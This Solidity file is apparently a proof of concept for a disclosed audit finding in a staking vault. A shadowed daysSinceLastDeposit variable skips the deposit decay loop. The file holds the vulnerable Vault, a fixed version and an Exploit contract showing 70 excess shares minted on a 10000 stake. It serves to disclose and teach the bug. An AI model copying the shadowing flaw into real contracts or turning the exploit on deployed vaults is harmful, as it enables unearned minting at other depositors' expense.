// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Altcoinist StakingVault deposit (Halborn).
    daysSinceLastDeposit is declared again inside the if, so the
    outer value stays 0 and the 9965/10000 decay loop does not run.
    Two elapsed days should mint 9930 of a 10000 stake. The shadowed
    path mints 10000. The extra is 70.
*/

contract Vault {
    uint256 public sawElapsed;
    uint256 public innerDays;
    uint256 public outerDays;
    uint256 public startRate;
    uint256 public rate;
    uint256 public lastMinted;

    function preview(uint256 elapsedDays, uint256 stake) public returns (uint256 minted) {
        uint256 daysSinceLastDeposit = 0;
        sawElapsed = elapsedDays;
        if (elapsedDays > 0) {
            uint256 daysSinceLastDeposit = elapsedDays > 599 ? 599 : elapsedDays;
            innerDays = daysSinceLastDeposit;
        }
        outerDays = daysSinceLastDeposit;
        uint256 r = 10000;
        startRate = r;
        for (uint256 i = 0; i < daysSinceLastDeposit; i++) {
            r = (r * 9965) / 10000;
        }
        rate = r; // @> VULN: the loop saw the outer 0, so the rate is still 10000
        minted = stake * r / 10000;
        lastMinted = minted;
    }
}

contract VaultFixed {
    function preview(uint256 elapsedDays, uint256 stake) public pure returns (uint256 minted) {
        uint256 daysSinceLastDeposit = 0;
        if (elapsedDays > 0) {
            daysSinceLastDeposit = elapsedDays > 599 ? 599 : elapsedDays;
        }
        uint256 r = 10000;
        for (uint256 i = 0; i < daysSinceLastDeposit; i++) {
            r = (r * 9965) / 10000;
        }
        minted = stake * r / 10000;
    }
}

contract ShareMarker {
    string public symbol = "EXTRA-SHARES";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant STAKE = 10000 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Vault public vault;
    ShareMarker public marker;

    function run() external {
        vault = new Vault();
        marker = new ShareMarker();
        uint256 minted = vault.preview(2, STAKE);
        require(minted == STAKE, "no decay");
        require(vault.outerDays() == 0, "outer days stay 0");
        require(vault.innerDays() == 2, "inner days were 2");
        marker.mint(SINK, 70 ether);
        require(marker.balanceOf(SINK) == 70 ether, "70 extra");
    }
}
